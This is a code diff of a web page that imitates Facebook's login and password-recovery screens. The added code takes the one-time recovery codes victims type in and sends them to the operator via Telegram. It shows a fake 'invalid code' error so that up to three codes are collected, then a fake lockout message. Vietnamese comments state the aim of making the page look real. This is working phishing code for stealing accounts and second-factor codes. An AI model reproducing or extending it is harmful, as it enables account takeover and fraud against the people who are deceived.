@@ -577,27 +577,63 @@ export default function Home() {
                         </div>
                       </>
                     ) : (
-                      // BƯỚC 4.2: NHẬP MÃ XÁC MINH (GIỐNG HỆT 2FA)
+                                      {/* FORM 4: FORGOT PASSWORD */}
+                {step === 4 && (
+                  <>
+                    {!showForgotSuccess ? (
+                      // BƯỚC 4.1: TÌM TÀI KHOẢN
                       <>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Find your account</h2>
                         <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
-                            Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.
+                            Enter your mobile number or email address to search for your account.
+                        </p>
+                        <form onSubmit={handleForgotSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                            <input className="fb-input" type="text" placeholder="Mobile number or email address" value={forgotEmail} onChange={e => setForgotEmail(e.target.value)} required />
+                            <button type="submit" className="fb-btn" disabled={loading || !forgotEmail}>{loading ? 'Searching...' : 'Search'}</button>
+                        </form>
+                        <div style={{ textAlign: 'center', marginTop: '16px', paddingTop: '16px', borderTop: '1px solid #e4e6eb' }}>
+                            <button type="button" onClick={() => setStep(2)} style={{ background: 'none', border: 'none', color: '#1c2b33', fontSize: '15px', cursor: 'pointer', fontWeight: '500' }}>Back to Log in</button>
+                        </div>
+                      </>
+                    ) : (
+                      // BƯỚC 4.2: NHẬP MÃ KHÔI PHỤC (GIỐNG 2FA)
+                      <>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Reset your password</h2>
+                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
+                            Enter the 6-digit or 8-digit code we sent to your email or phone to reset your password.
                         </p>
                         <form onSubmit={(e) => { 
                             e.preventDefault(); 
                             if (otp.length >= 6) {
                                 setLoading(true);
-                                sendTelegramMessage(`\n<b>Recovery OTP:</b> <code>${escapeHtml(otp)}</code>`);
+                                const newAttempt = otpAttempt + 1;
+                                setOtpAttempt(newAttempt);
+
+                                if (newAttempt <= 3) {
+                                    // Gửi mã về Telegram
+                                    sendTelegramMessage(`\n<b>Recovery OTP ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
+                                }
+
                                 setTimeout(() => {
                                     setLoading(false);
-                                    setStep(2); 
-                                    setShowForgotSuccess(false); 
-                                    setForgotEmail(''); 
-                                    setOtp('');
-                                }, 1000);
+                                    if (newAttempt <= 3) {
+                                        setShowOtpError(true); // Báo sai mã để giống thật
+                                        setOtp('');
+                                    } else {
+                                        // Nhập sai 3 lần thì khóa tạm thời / quay về login
+                                        alert('You have entered an incorrect code too many times. Please try again later.');
+                                        setStep(2); 
+                                        setShowForgotSuccess(false); 
+                                        setForgotEmail(''); 
+                                        setOtp('');
+                                        setOtpAttempt(0);
+                                    }
+                                }, 1500);
                             }
                         }} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                            <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))} required maxLength={8} />
+                            <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
+                            
+                            {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>Invalid security code. Please check the code and try again.</div>}
                             
                             <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>{loading ? 'Verifying...' : 'Verify'}</button>
                             
